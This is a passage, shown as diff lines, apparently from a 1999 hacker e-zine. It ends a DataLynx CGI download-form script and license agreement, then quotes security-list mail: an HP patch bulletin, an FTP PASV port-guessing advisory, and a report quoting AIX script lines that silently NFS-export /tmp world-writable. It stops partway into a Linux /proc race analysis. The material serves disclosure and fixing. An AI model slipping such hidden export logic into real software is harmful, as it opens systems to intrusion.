+      <center>Please make sure your browser knows that a file with a '.Z' extension is a binary file.  If you have any questions about this, please call our support department at (619) 560-8112.</center></blockquote>
+    <blockquote>
+        <center>All evaluation software available to download from
+        this site is secured for authorized use only. A license code
+        must be obtained prior to use for evaluation or after
+        purchase. An evaluation key will be valid for THIRTY (30)
+        days after which you must purchase in order to continue use.
+        </center>
+    </blockquote>
+    
+    <blockquote>
+        <center><p>In most cases you will receive new license codes
+        within 24 hours. Be sure to include the original keycodes in
+        your email. Directions for obtaining these codes are shown
+        below.</p>
+        </center>
+    </blockquote>
+    <center>
+    
+    <table border="4" width="100%" bordercolor="#004227">
+      <tr>
+        <td align="center" width="50%">
+          <font color="#0000FF" size="+1">If you are installing GUARDIAN:</font>
+        </td>
+        <td align="center" width="50%">
+          <font color="#0000FF"  size="+1">If you are installing suGUARD:</font>
+        </td>
+      </tr>
+      <tr>
+        <td valign="top" width="50%">
+        <p><b></b></p>
+        <p><font size="2"><b><u><center>To install the software on your system:</center></u></b></font></p>
+          <font size="2">
+          <ol type="1">
+            <li>Uncompress the file you have downloaded</li>
+            <li>Extract these files using 'tar':
+              <blockquote><font face="Arial Black" size="2" color="#FF0000">&#183;</font>&nbsp;
+              <i><b>install.guardian</b></i>
+                     <br><font face="Arial Black" size="2" color="#FF0000">&#183;</font>&nbsp;
+              <i><b>GD_RELEASE_NOTICE.txt</b></i></blockquote>
+            </li>
+            <li>Use the instructions in the release notice to install the software on your system</li>
+            <li>Login to your 'root' account</li>
+            <li>Enter the following commands:
+                <blockquote><font face="Arial Black" size="2" color="#0000ff">&#183;</font>&nbsp;
+                <b><font size="2">cd &nbsp; /bin/datalynx </font></b>
+                <br><font face="Arial Black" size="2" color="#0000ff">&#183;</font>&nbsp
+                <b><font size="2">guardian &nbsp; -i</font></b></blockquote>
+            </li>
+          </ol></font>
+          <p><font color="#FF0000" size="-1">You should see the following:</font></p>
+          <blockquote>
+          <font size="-1">GUARDIAN: Software Installation Program.</font>
+          <font size="-1"><br>Copyright (c) Datalynx, Inc., 1994-6</font>
+          <font size="-1"><br>Current GUARDIAN security values are:</font>
+          <font size="-1"><br>1: xxxxxxxx</font>
+          <font size="-1"><br>2: xxxxxxxx</font>
+          <font size="-1"><br>3: xxxxxxxx</font></p>
+          <p><font size="-2">Please call DataLynx or your authorized representative</font>
+          <font size="-2">for instructions on installing your software.</font></p>
+          <p><font size="-1">Enter new keycode 1:&nbsp; &nbsp; </font><b>
+          <font size="+0">0</font></b></p>
+          </blockquote>
+          <p><font color="#FF0000" size="-1">Entering a zero
+            for 'keycode 1' will exit the program.</font></p>
+          <p><font color="#FF0000" size="-1"><b><i>e-mail</i></b> the
+            current values to DataLynx. When you receive your new
+            codes, redo steps 4 and 5 and enter these values.</font></p>
+        </td>
+        <td valign="top" width="50%">
+        <p><b></b></p>
+        <p><font size="2"><b><u><center>To install the software on your system:</center></u></b></font></p>
+          <font size="2">
+          <ol type="1">
+            <li>Uncompress the file you have downloaded</li>
+            <li>Extract these files using 'tar':
+              <blockquote><font face="Arial Black" size="2" color="#FF0000">&#183;</font>&nbsp;
+              <i><b>install.suguard</b></i>
+                     <br><font face="Arial Black" size="2" color="#FF0000">&#183;</font>&nbsp;
+              <i><b>SG_RELEASE_NOTICE.txt</b></i></blockquote>
+            </li>
+            <li>Use the instructions in the release notice to install the software on your system</li>
+            <li>Login to your 'root' account</li>
+            <li>Enter the following commands:</li>
+                <blockquote><font face="Arial Black" size="2" color="#0000ff">&#183;</font>
+                <b><font size="-1">&nbsp;cd &nbsp; /bin/datalynx/suguard.dir</font></b>
+                <br><font face="Arial Black" size="2" color="#0000ff">&#183;</font>&nbsp;
+                <b><font size="-1">suguard &nbsp; -i</font></b></blockquote>
+            </li>
+          </ol></font>
+          <p><font color="#FF0000" size="-1">You should see the following:</font></p>
+          <blockquote>
+          <font size="-1">suGUARD: Software Installation Program.</font>
+          <font size="-1"><br>Copyright (c) DataLynx Inc., 1996</font>
+          <font size="-1"><br>Current suGUARD security values are:</font>
+          <font size="-1"><br>1:xxxxxxxx</font>
+          <font size="-1"><br>2: xxxxxxxx</font>
+          <font size="-1"><br>3: xxxxxxxx</font></p>
+          <p><font size="-2">Please call DataLynx or your authorized representative</font>
+          <font size="-2">for instructions on installing your software.</font></p>
+          <p><font size="-1">Enter new keycode 1: &nbsp; &nbsp;</font>
+          <b><font size="+0">0</font></b></p>
+          </blockquote>
+          <p><font color="#FF0000" size="-1">Entering a zero
+            for 'keycode 1' will exit the program.</font></p>
+          <p><font color="#FF0000" size="-1"><b><i>e-mail</i></b> the
+            current values to DataLynx. When you receive your new
+            codes, redo steps 4 and 5 and enter these values.</font></p>
+        </td>
+      </tr>
+    </table>
+    </CENTER>
+    
+    <CENTER><P><INPUT TYPE="submit" NAME="verified" VALUE="Continue"></P></CENTER>
+    
+    <P></FORM></P>
+    
+    </BODY>
+    </HTML>~;
+      }
+    
+    #######################################################################
+    #                   display_eula Subroutines          #
+    #######################################################################
+    
+    sub display_eula_screen
+      {
+    print "Content-type: text/html\n\n\n";
+    print qq~
+    <HTML>
+    <HEAD>
+    <META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=windows-1252">
+    <META NAME="Generator" CONTENT="Microsoft Word 97">
+    <TITLE>webeval</TITLE>
+    <META NAME="Template" CONTENT="C:\PROGRAM FILES\MICROSOFT OFFICE\OFFICE\html.dot">
+    </HEAD>
+    <BODY LINK="#0000ff" VLINK="#800080">
+    
+     <FORM ACTION="http://www.dlxguard.com/cgi-bin/Form_processor/form_processor.cgi" 
+           METHOD="POST">~;
+      foreach $variable (@form_variables)
+        {           
+        $form_data{$variable} =~ s/"/&quot;/g;
+        $form_data{$variable} =~ s/\</&lt;/g;
+        $form_data{$variable} =~ s/\>/&gt;/g;
+        $form_data{$variable} =~ s/\n/\<P\>/g;
+        print qq~
+        <INPUT TYPE = "hidden" NAME = "$variable"
+               VALUE = "$form_data{$variable}">~;
+        }           
+      print qq~
+      <INPUT TYPE = "hidden" NAME = "setup_file" 
+             VALUE = "$location_of_setup_file">
+    
+    <P>
+    </P>
+    <B><P ALIGN="CENTER">DataLynx, Inc. Software Evaluation Agreement</P>
+    </B><P ALIGN="CENTER">&nbsp;</P>
+    <P>This DataLynx, Inc. Software Evaluation Agreement ("Agreement") by and between DataLynx, Inc., a California corporation ("DataLynx, Inc." or "Licensor") having its principal offices at 6633 Convoy Court, San Diego, CA 92111 USA, and<U> </U>("Licensee"), and any person or Corporation who evaluates Licensor's products sets forth the terms and conditions under which Licensee may use the evaluation computer software ("Program"), Manuals, and other system documentation (collectively, "Documentation") currently available from DataLynx, Inc. for the Program.</P><DIR>
+    
+    <B><P>1. Scope of Use. Licensee may:</P>
+    </B><P>A.&#9;Install and use the Program only at Licensee's own facility and only for the purpose of evaluating its effectiveness and suitability for Licensee's internal business activities;</P>
+    <P>B.&#9;Make one copy of the Program for said purposes; and</P>
+    <P>C.&#9;Use the documentation only in conjunction with installation and use of the Program for the stated purpose.</P>
+    <P>D.&#9;Licensee agrees not to rely on Program in any way that may affect Licensee's normal business operations.</P>
+    <P>E.&#9;Licensee may only use the evaluation program and documentation as set forth above and licensee's rights are not transferable.</P>
+    <B><P>2.&#9;Term.</P>
+    </B><P>A.&#9;Licensee may use the Program and Documentation for 30 days after receipt, unless terminated sooner hereunder. Within a reasonable time after the conclusion of the evaluation period, Licensee must remove the Program and Documentation files from Licensee's computer system unless Licensee agrees with DataLynx, Inc. to acquire a license to use the Program on an on-going basis.</P>
+    <B><P>3.&#9;Proprietary Protection.</P>
+    </B><P>A.&#9;Licensee acknowledges that DataLynx, Inc. claims it has sole and exclusive ownership of all right, title, and interest in and to the Program and Documentation (including all Trade Secrets pertaining thereto), subject only to the rights and privileges expressly granted by DataLynx, Inc.. This Agreement does not provide Licensee with Title or ownership of the Program or Documentation, but only a right of limited use.</P>
+    <P>B.&#9;The Program and Documentation, and the Trade Secrets contained therein (collectively, the "Proprietary Information"), are commercially valuable, proprietary products of DataLynx, Inc., which are treated by DataLynx, Inc. as confidential. DataLynx, Inc. has entrusted the Proprietary Information to Licensee in confidence to use only as expressly authorized. As used herein, Trade Secrets include any scientific or technical information, concept, design, process, procedure, formula, or improvement that is commercially valuable and secret (in the sense that its confidentiality affords DataLynx, Inc. a competitive advantage over its competitors).</P>
+    <P>C.&#9;Exceptions to Proprietary Information. The obligations of confidentiality and restriction on use in Section B shall not apply to any Proprietary Information that: (i) was in the public domain prior to the date of this Agreement or subsequently came into the public domain through no fault of the Licensee; or (ii) was lawfully received by Licensee from a third party free of any obligation of confidence to the third party; or (iii) was already in Licensee's possession prior to receipt from Licensor; or (iv) is required to be disclosed in a judicial or administrative proceeding after all reasonable legal remedies for maintaining such information in confidence have been exhausted; or (v) is subsequently and independently developed by Licensee's employees, consultants, or agents without reference to Proprietary Information.</P>
+    <P>D.&#9;The Licensor claims and reserves to itself all rights and benefits afforded under U.S. copyright law and all International copyright conventions in the Program and Documentation. Portions of the Program may be covered by applications for patents in the U.S. and elsewhere.</P>
+    <P>E.&#9;Licensee may not, at any time, disclose or disseminate all or any part of the Proprietary Information to any third party. Licensee may not "unlock" or "reverse engineer" the code of the Program, as the terms are generally used in the trade. Licensee will ensure that all Licensee's personnel afforded access to the Proprietary Information shall take all reasonable precautions to protect it against improper use, dissemination, or disclosure.</P>
+    <P>F.&#9;Licensee acknowledges that, in the event of the Licensee's breach of any of the foregoing provisions, DataLynx, Inc. will not have an adequate remedy in money or damages. DataLynx, Inc. shall therefore be entitled to seek an injunction against such breach from any court of competent jurisdiction immediately upon such breach. DataLynx, Inc.'s right to obtain injunctive relief shall not limit its right to seek further remedies.</P>
+    <P>G.&#9;The Licensee shall devote its best efforts, consistent with the practices and procedures under which it protects its own most valuable proprietary information and materials, to protect the Program and Documentation against any unauthorized or unlawful use or copying.</P>
+    <P>H.&#9;The Licensee shall make no hard copies of the Program or associated documentation, and may store Program in memory only as may be necessary for the normal operation of the Program on one CPU for use on one terminal.</P>
+    <P>I.&#9;Licensee's obligations hereunder to protect DataLynx, Inc.'s Proprietary Information shall survive the evaluation period and remain in effect for so long as DataLynx, Inc. is entitled to protection of its rights in the Program and Documentation under applicable law.</P>
+    <B><P>4.&#9;Warranties.</P>
+    </B><P>A.&#9;The Licensor warranties that it has the right to enter into this Agreement and fully perform all obligations undertaken in this Agreement.</P>
+    <P>B.&#9;The licensor disclaims any and all promises, representations, and warranties, except as expressly set forth in this agreement, with respect to any data, information, or other material furnished to the Licensee hereunder, including their condition; conformity to any representation or description; the existence of any latent or patent defects; and title, merchantability, or fitness for a particular purpose or use.</P>
+    <P>C.&#9;in no event shall the licensor be liable to the licensee for any loss of profits; any incidental, special, exemplary, or consequential damages; or any claims or demands brought against the licensor even if the licensor has been advised of the possibility of such damages.</P>
+    <B><P>5.&#9;Indemnification.</P>
+    </B><P>A.&#9;If a third party claims that the Licensed Program infringes its patent, copyright, or trade secret, or any similar intellectual property right, Licensor will defend Licensee against that claim at Licensor's expense and pay all damages that a court finally awards, provided that Licensee promptly notifies Licensor in writing of the claim, and allows Licensor to control, and cooperate with Licensor in, the defense or any related settlement negotiations. However, Licensor has no obligation for any claim based on Licensee's modification of the Licensed Program or its combination, operation, or use with any product, data, or apparatus not specified or provided by Licensor, provided that such claim solely and necessarily is based on such combination, operation, or use and such claim would be avoided by combination, operation, or use with products, data, or apparatus specified or provided by Licensor. this paragraph states licensor's entire obligation to licensee with respect to any claim of infringement.</P>
+    <B><P>6.&#9;Miscellaneous.</P>
+    </B><P>A.&#9;Licensee may not sell, assign or otherwise transfer any right or obligation hereunder without the prior written consent of DataLynx, Inc.. The Agreement shall be governed and construed according to the laws of the State of California, and shall be effective on the date last written below.</P>
+    <P>B.&#9;This Agreement constitutes the entire agreement of the parties hereto and supersedes all prior representations, proposals, discussions, and communications, whether oral or in writing. This Agreement may be modified or amended only with the prior written consent of authorized representatives of both parties.</P>
+    <P>C.&#9;If the Program will run on computers located outside the United States, Licensee is responsible for meeting all import requirements for cryptography in the country of operation.</P></DIR>
+    
+    
+    By clicking the "I Agree" button below, I accept and approve of the above Software Evaluation Agreement</DD>
+    </DL></DIR>
+    
+    <P>
+    <INPUT TYPE="submit"  NAME="verified" VALUE="I Agree">
+    <INPUT TYPE="submit" NAME="verified" VALUE="I Disagree">
+    </P></FORM>
+    <P><HR></P>
+    <H5 ALIGN="CENTER"><BR>
+    Copyright &copy; 1997 DataLynx, Inc. All rights reserved.<BR>
+    Revised: <!--webbot bot="TimeStamp" s-type="EDITED"</H5></H5>
+    s-format="%B %d, %Y" startspan -->August 1, 1997<!--webbot
+    bot="TimeStamp" endspan i-checksum="14450" -->. 
+    <P><HR></P>
+    <H5>&nbsp;</H5></BODY>
+    </HTML>~;
+    }
+    
+    #######################################################################
+    #                   display_verification_screen Subroutines           #
+    #######################################################################
+    
+    sub display_verification_screen
+      {
+      print "Content-type: text/html\n\n\n";
+      print qq~
+      <HTML>
+      <HEAD>
+      <TITLE>Form Verification Screen</TITLE>
+      </HEAD>
+      <BODY BGCOLOR = "FFFFFF" TEXT = "000000">~;
+    
+    #####################################################################################################
+    # Added by JOB - If a file was chosen to be downloaded we must display the EULA (license agreement) #
+    # otherwise we can just continue with the form_processor.                                           #
+    #####################################################################################################
+    
+      if ($form_data{'filename'} eq "")
+        {
+          print qq~
+          <FORM METHOD = "POST" ACTION = "form_processor.cgi">~;
+        }
+      if ($form_data{'filename'} ne "")
+        {
+          print qq~
+          <FORM METHOD = "POST" ACTION = "preexp.cgi">~;
+        }
+      foreach $variable (@form_variables)
+        {           
+        $form_data{$variable} =~ s/"/&quot;/g;
+        $form_data{$variable} =~ s/\</&lt;/g;
+        $form_data{$variable} =~ s/\>/&gt;/g;
+        $form_data{$variable} =~ s/\n/\<P\>/g;
+        print qq~
+        <INPUT TYPE = "hidden" NAME = "$variable"
+               VALUE = "$form_data{$variable}">~;
+        }           
+    
+      print qq~
+      <INPUT TYPE = "hidden" NAME = "setup_file" 
+             VALUE = "$location_of_setup_file">
+      <H2>
+      <BLOCKQUOTE>
+      You submitted the following information:
+      <TABLE>~;
+      
+      foreach $variable (@form_variables)
+        {
+        print qq~
+        <TR>
+        <TH ALIGN = "left" VALIGN = "top">$form_variable_name_map{$variable}</TH>
+        <TD>$form_data{$variable}</TD>
+        </TR>~;
+        }
+      print qq~     
+      </TABLE>
+      </BLOCKQUOTE>
+      <CENTER>
+      <INPUT TYPE = "submit" NAME = "verified" VALUE = "Correct!">
+      </CENTER>   
+      </FORM>
+      </BODY>  
+      </HTML>~;
+    }
+    
+    @HWA
+
+  
+  8.0 Mailzone
+      ~~~~~~~~
+
+    The Linux Penguins, Live on stage! 
+    penguin cam  http://www.montrealcam.com/en-biodome.html
+    Seen on slashdot ... http://www.slashdot.org/
+    
+    
+    
+    ***** MAILZONE ************************************************************
+    * RECENT BUGTRAQ/LIST TRAFFIC/EXPLOIT CODE                                *
+    ***************************************************************************
+   
+   
+    "... as the Bell helmet company used to advertise a long time ago, 
+    You put a $10 helmet on a $10 head. "
+    
+    
+    Digest Name:† Daily Security Bulletins Digest
+††† Created:† Mon Feb† 8† 3:00:02 PST 1999
+
+    Table of Contents:
+
+    Document ID††††† Title
+    ---------------† -----------
+    HPSBUX9902-091†† Security Vulnerability with rpc.pcnfsd
+
+    The documents are listed below.
+    -------------------------------------------------------------------------------
+
+    Document ID:† HPSBUX9902-091
+    Date Loaded:† 19990207
+††† Title:† Security Vulnerability with rpc.pcnfsd
+
+    -------------------------------------------------------------------------
+††† HEWLETT-PACKARD COMPANY SECURITY BULLETIN: #00091, 08 Febraury 1999
+    -------------------------------------------------------------------------
+
+    The information in the following Security Bulletin should be acted upon
+    as soon as possible.† Hewlett-Packard Company will not be liable for any
+    consequences to any customer resulting from customer's failure to fully
+    implement instructions in this Security Bulletin as soon as possible.
+    
+    -------------------------------------------------------------------------
+    PROBLEM:† rpc.pcnfsd has an error in its use of the spool directory
+    
+    PLATFORM: HP 9000 series 700/800.
+    
+    DAMAGE:†† Remote and local users can compromise root access.
+    
+    SOLUTION: Install _all_ applicable patches listed below.† Reboot required.
+    
+    AVAILABILITY:† All patches are available now.
+    
+    -------------------------------------------------------------------------
+    I.
+    †† A. Background
+    ††††† rpc.pcnfsd is a remote procedure call used by NFS clients which is
+    ††††† a service providing username and password authentication for system
+    ††††† which have NFS client software installed.
+    ††††† If exploited, this defect allows the main printer spool directory
+    ††††† used by rpc.pcnfsd to be made world writeable.
+    
+    †† B. Fixing the problem
+    ††††† This involves installing a series of patches which require
+    ††††† rebooting the system.† The main patch requires a libc patch,
+    ††††† which in turn requires a kernal patch.
+    
+    ††††††† For HP-UX 10.01:††††††††††††††††††††††† PHNE_17248
+    ††††††† For HP-UX 10.10:††††††††††††††††††††††† PHNE_17248
+    ††††††† For HP-UX 10.20:††††††††††††††††††††††† PHNE_17098
+    ††††††† For HP-UX 11.00:††††††††††††††††††††††† PHNE_16470
+    
+    ††††† The following sets of patches will need to be installed to resolve
+    ††††† all the documented patch dependencies.† The dependencies will be
+    ††††† satisfied by the patches listed, or any patch that supersedes them:
+    
+    ††††††† s700 10.01:†††† PHNE_17248, PHKL_7059,† PHCO_14253;
+    ††††††† s800 10.01:†††† PHNE_17248, PHKL_7060,† PHCO_14253;
+    ††††††† s700 10.10:†††† PHNE_17248, PHKL_8292,† PHCO_14254;
+    ††††††† s800 10.10:†††† PHNE_17248, PHKL_8293,† PHCO_14254;
+    ††††††† s700 10.20:†††† PHNE_17098, PHKL_9155,† PHKL_16750,
+    ††††††††††††††††††††††† PHCO_13777, PHCO_12922, PHCO_17389,
+    ††††††††††††††††††††††† PHNE_16237, PHKL_16959, PHKL_17012,
+    ††††††††††††††††††††††† PHKL_17253, PHKL_12007;
+    ††††††† s800 10.20:†††† PHNE_17098, PHKL_9156,† PHKL_16751,
+    ††††††††††††††††††††††† PHCO_13777, PHCO_12922, PHCO_17389,
+    ††††††††††††††††††††††† PHNE_17097, PHKL_16957, PHKL_17013,
+    ††††††††††††††††††††††† PHKL_17254, PHKL_12008;
+    ††††††† s700 11.00:†††† PHNE_16470, PHCO_16629, PHKL_15689,
+    ††††††††††††††††††††††† PHCO_14625;
+    ††††††† s800 11.00:†††† PHNE_16470, PHCO_16629, PHKL_15689,
+    ††††††††††††††††††††††† PHCO_14625.
+    
+    ††††† NOTE: This problem is fixed fully in HP-UX release 11.01.
+
+    /////////////////////////////////////////////////////////////////////////////////
+        
+    To: BUGTRAQ@netspace.org
+    Subject: A warning about training from se7en and NDI to all security professionals
+    
+    
+    From: Mixmaster <mixmaster@remail.obscura.com>
+    To: aaa-list@lists.netlink.co.uk
+    
+    
+    > I am rep. from newdimensions
+    
+    I'm sorry but I have taken one of the New Dimensions programs
+    on computer security and I am glad that I wasn't in the private
+    sector paying for this program, I work in a security department 
+    of a large American miltary/industrial corporation and I wasn't
+    too taken by the instructors, This one asian girl was almost 
+    reading off of cue cards it was that bad, She knew as about 
+    hacking and securing networks as I did brain surgery, and I 
+    was promised in the mailing I got from my boss, Route of 
+    Phrack fame and got some hacker I never heard of called se7en?† 
+    I was really there to hear Route, and I was *VERY* disappointed! 
+    
+    
+    The study guide was ripped not so cleanly from 'Maxinum Internet 
+    Security' and covered topics I would have expected in a course
+    teaching 'fresh newbies' to Internet security.† Not the hardended
+    program in getting tough with hackers like I was promised. I doubt 
+    that most of you would be willing to pay the $1295 for the same 
+    course I got, and wasn't too pleased with, I learned more from the 
+    others attending the class than from the instructors, You can find 
+    better courses from attending BlackHat or Defcon than this.
+    
+    I should also mention that I have lurked on this list for some 
+    time and know that DUECE3815 has a hard enough time forming complete 
+    sentences let alone selling all of you on computer security courses,
+    But as the Bell helmet company used to advertise a long time ago, 
+    You put a $10 helmet on a $10 head. 
+    
+    
+    ______________________________________________________
+    Get Your Private, Free Email at http://www.hotmail.com
+
+   
+    Delivered-To: nt-out-link@iss.net
+    Received: (qmail 23021 invoked by alias); 2 Feb 1999 20:34:49 -0000
+    Delivered-To: nt-out@iss.net
+    Received: (qmail 22893 invoked by uid 15); 2 Feb 1999 20:34:45 -0000
+    Received: (qmail 22855 invoked from network); 2 Feb 1999 20:34:42 -0000
+    Received: from loki.iss.net (root@208.21.0.3)
+      by phoenix.iss.net with SMTP; 2 Feb 1999 20:34:42 -0000
+    Received: from arden.iss.net (nt-mod@arden.iss.net [208.21.0.8]) by loki.iss.net (8.8.7/8.7.3) with ESMTP id PAA23494 for <ntsecurity@phoenix.iss.net>; Tue, 2 Feb 1999 15:33:12 -0500
+    Received: (from nt-mod@localhost) by arden.iss.net (8.8.5/8.7.3) id PAA26652 for ntsecurity@iss.net; Tue, 2 Feb 1999 15:34:37 -0500
+    Received: (qmail 9725 invoked from network); 2 Feb 1999 17:37:58 -0000
+    Received: from loki.iss.net (root@208.21.0.3)
+      by phoenix.iss.net with SMTP; 2 Feb 1999 17:37:58 -0000
+    Received: from send501.yahoomail.com (web504.yahoomail.com [128.11.68.71]) by loki.iss.net (8.8.7/8.7.3) with SMTP id MAA08342 for <ntsecurity@iss.net>; Tue, 2 Feb 1999 12:36:29 -0500
+    Message-ID: <19990202173911.7840.rocketmail@send501.yahoomail.com>
+    Received: from [170.12.25.93] by web504.yahoomail.com; Tue, 02 Feb 1999 09:39:11 PST
+    Date: Tue, 2 Feb 1999 09:39:11 -0800 (PST)
+    
+From: loose goose <drdelam@yahoo.com>
+    Subject: [NTSEC] New Exploit - FTP PASV "Pizza Thief" Exploit
+    To: ntsecurity@iss.net
+    MIME-Version: 1.0
+    Content-Type: text/plain; charset=us-ascii
+    Sender: owner-ntsecurity@iss.net
+    Precedence: bulk
+    Reply-To: loose goose <drdelam@yahoo.com>
+    X-Loop: ntsecurity
+    X-Comment: TO UNSUBSCRIBE: email "unsubscribe ntsecurity" to majordomo@iss.net
+    X-Comment: DO NOT send subscribe/unsubscribe messages to ntsecurity@iss.net
+    
+    
+    TO UNSUBSCRIBE: email "unsubscribe ntsecurity" to majordomo@iss.net
+    Contact ntsecurity-owner@iss.net for help with any problems!
+    ---------------------------------------------------------------------------
+    
+    InfoWar Security Advisory #01 
+    (http://www.infowar.com) 
+    February 1st, 1999
+    
+    FTP PASV "Pizza Thief" Exploit
+    Author: Jeffrey R. Gerber
+    
+    PROBLEM:
+    Legitimate FTP clients may experience Denial of Service and rogue FTP
+    clients may obtain unauthorized access to data.
+    
+    PLATFORM:
+    All operating systems. All FTP clients and FTP servers affected.
+    
+    DAMAGE:
+    Data loss, data corruption, and denial of service.
+    
+    SOLUTION:
+    Proposed solutions follow at the end of this document.
+    
+    VULNERABILITY ASSESSMENT:
+    Risk is medium. The ability for this attack to be performed is not
+    100% guaranteed. The higher the volume of traffic an FTP server sees,
+    the higher the potential for a successful attack. This attack has not
+    yet been observed in the wild.
+    
+    Synopsis:
+    The Pizza Thief exploit relies on the FTP Passive (PASV) mode of
+    operation. When a client connects to a server using the PASV mode, the
+    server opens a port for data transfer to the client. As observed on
+    all tested FTP servers, any client other than the legitimate client
+    may just as equally connect to the allocated data port. Typical
+    behavior is that the first client to connect to the data port gets the
+    data. Any following connections from other clients (including the
+    legitimate client) will either be rejected or connect without
+    reception of data.
+    
+    Description:
+    RFC 765 "FILE TRANSFER PROTOCOL", Page 23 describes the "TRANSFER
+    PARAMETER COMMANDS" for FTP. Two named transfer parameter commands are
+    DATA PORT (PORT) and PASSIVE (PASV). Either PORT or PASV is used by
+    FTP to establish a data connection, the Data Transfer Process (DTP).
+    FTP data connections are frequently followed by the RETRIEVE (RETR),
+    STORE (STOR), APPEND (with create) (APPE), and LIST (LIST) commands
+    which use the DTP.
+    
+    When a DTP connection is established between an FTP client and an FTP
+    server, either the server listens for a connection from the client
+    (PASV command) or the client listens for a connection from the server
+    (PORT command).
+    
+    If a PORT command is issued to the server, the server requires the
+    client to state at which network address and on which port the server
+    is to connect to the client. The PORT command is of the format: "PORT
+    h1,h2,h3,h4,p1,p2" where h1,h2,h3,h4 is the client's network address,
+    and p1,p2 is the 16 bit client port number in an 8 bit high,low bit
+    order. If a PASV command is issued to the server, the server responds
+    to the client, telling the client at what network address and on what
+    port the client is to connect to the server. The PASV command takes no
+    parameters.
+    
+    The "Postel's Pizza Parlor" FTP analogy:
+    
+    Mr. Postel runs a fine pizza parlor in Anytown, CA. In recent years
+    Mr. Postel added two new services to his business: "Carry Out" and
+    "Delivery". Customers thoroughly enjoy both services.
+    
+    Some customers living in gated communities, a recent housing
+    phenomenon that has been continually expanding, have found it
+    necessary to use Carry Out rather than Delivery since the delivery
+    
+person frequently has problems getting through the front gate.
+    Although the gated community customers find carry out a bit of a pain
+    they enjoy the compromise for their higher level of security in living.
+    
+    Mr. Postel's business ran fine for a while but he soon noticed two
+    erroneous phenomenon: 1) Some Delivery pizza's were being delivered to
+    the wrong addresses. 2) Some Carry Out customers were arguing that
+    their pizza wasn't ready when they arrived. After carefully looking
+    into the Delivery issue, Mr. Postel discovered that some customers
+    were calling and having pizza's delivered to wrong addresses or to
+    individuals that didn't order a pizza. Mr. Postel surmised that either
+    the caller was doing this as a prank or they were, for whatever
+    strange reasons, making notes of where the pizzas were able to be
+    delivered and not delivered. After looking into the Carry Out problem,
+    Mr. Postel determined that "pizza thieves" were comming into the store
+    and asking to pick up pizzas that were not their own by guessing
+    likely order numbers (the method by which a customer asks for his or
+    her pizza). The legitimate customers were then arriving only to find
+    that their pizza wasn't ready.
+    
+    After careful thought on the Carry Out problem, Mr. Postel decided to
+    make it a policy for the calling customers to state their home
+    address. Now when the customer comes into the pizza parlor, the server
+    will check the person's drivers license for a matching address. The
+    Carry Out problem analogously describes the problem with the current
+    FTP PASV connection methodology. Presently, most if not all, FTP
+    servers on the Internet are succeptible to a "pizza thief" attack.
+    This attack involves a rogue client making educated guesses at
+    potential port numbers (pizza order numbers). Port number prediction
+    is possible by repetitive sampling of server responses from the PASV
+    command. Many servers allocate new port numbers by allocating a new
+    port number at a value one higher than the last used port number. This
+    is analogous to a pizza thief sitting in a waiting room, listening to
+    previous order numbers and then guessing at a currently pending order
+    number and asking for it.
+    
+    In the past, the PASV connection method was used with far less
+    frequency than the preferred PORT connection method. The use of PASV
+    has been increasing proportionately with an increased frequency of
+    clients sitting behind firewalls (gated communities). The pizza thief
+    attack thus becomes more effective by day.
+    
+    Recommendations:
+    Solving the problem requires careful thought. Server programmers can
+    program a server to identify the client address associated with the
+    control port and only allow data port connections from the client
+    address, however this server would not be RFC compliant.
+    
+    In the FTP standard, server to server connections are possible by use
+    of the PORT command on server A and the PASV command on server B. The
+    client directs both server A and B to connect to each other. In this
+    case, assume that server A accepts the PASV command. Server A will
+    find that the address of the client on the control port does not match
+    the address associated with the data connection (which is server B's
+    
+address).
+    
+    A possible solution is an RFC obsoletion or update, documenting a new
+    form of the PASV command, PASX for "PASsiVe eXtended". The PASX
+    command would take address arguments in the form h1,h2,h3,h4 just as
+    the PORT command uses, sans port numbers p1,p2. In using PASX, both
+    the client to server connections and the server to server connections
+    would remain compliant with current RFC methodologies, yet adding a
+    much needed layer of authentication.
+    
+    RFC 2228 "FTP SECURITY EXTENSIONS" has addressed the issue of securing
+    the data channel with the DATA CHANNEL PROTECTION LEVEL (PROT)
+    extension and use of data encapsulation. Through the use of a secured
+    data channel, the Pizza Thief threat is reduced to a simple denial of
+    service attack. 
+    
+    
+    
+    
+    
+    
+    _________________________________________________________
+    DO YOU YAHOO!?
+    Get your free @yahoo.com address at http://mail.yahoo.com
+
+   
+    Date: Fri, 29 Jan 1999 21:43:51 PST
+    From: Ryan McRonald <mcronald@NETSCAPE.NET>
+    To: BUGTRAQ@netspace.org
+    Subject: TROJAN: netstation.navio-comm.rte 1.1.0.1
+    
+      While configuring some IBM Network Station 300s I noticed that my /tmp
+    directory had become NFS exported and world read/writeable!!  I traced
+    this to one of the configuration scripts that is included in AIX's
+    netstation.navio-com.rte 1.1.0.1 used for the Navio NC browser.
+    
+    >From /usr/netstation/bin/Xnav:
+    
+    1)  Magic number is munged ... pet peeve of mine:
+    
+        +1  # @(#)93  1.3 src/nav/aix/Xnav.cpp, navio, 41navio110
+        +2  #!/bin/ksh
+        +3  #
+        ...
+    
+    2)  This part is somewhat problematic:
+    
+       ...
+       +98  grep "/tmp" /etc/exports > /dev/null 2>&1
+       +99  if [ $? -ne 0 ]; then
+      +100          echo "/tmp" >> /etc/exports
+      +101          /usr/sbin/exportfs -a
+      +102  fi
+       ...
+    
+    The fix:
+    
+    1) Do you have netstation.navio.comm-rte installed?
+    
+      # lslpp -l netstation.navio-comm-rte
+    
+    2)  Check if /tmp is exported with:
+    
+      # exportfs
+    
+    3) If /tmp is exported run:
+    
+      # /usr/sbin/rmnfsexp -d /tmp -B
+    
+    This emphasizes the importance of running a regular "sanity" security
+    audits such as satan or ISS.
+    
+    regards from a long-tine bugtraq lurker,
+    
+    Ryan
+    
+    
+    //////////////////////////////////////////////////////////////////////////
+    /proc 3 way smp race condition in Linux 2.2.1 kernel
+    //////////////////////////////////////////////////////////////////////////
+
+    Date: Tue, 2 Feb 1999 17:39:13 +0100
+    From: Andrea Arcangeli <andrea@E-MIND.COM>
+    To: BUGTRAQ@netspace.org
+    Subject: [patch] /proc race fixes for 2.2.1 (fwd)
+    
+    This is a short analysis I've done yesterday about the array.c
+    (/proc/pid/...) races of Linux-2.2.0 and Linux-2.2.1. These races was
+    leading to very easily reproducible crashes and Oopses in linux-2.2.0. But
+    Linux-2.2.1 is not been completly fixed. There's still a potential race
+    very hard to reproduce (I think you need at least a 3way smp). You can
+    find a kind of /proc sniffer in this email. At the end of this email
+    you'll find my complete fix for 2.2.1.
+    
+    The race if exploited can lead at least to reading data from random used
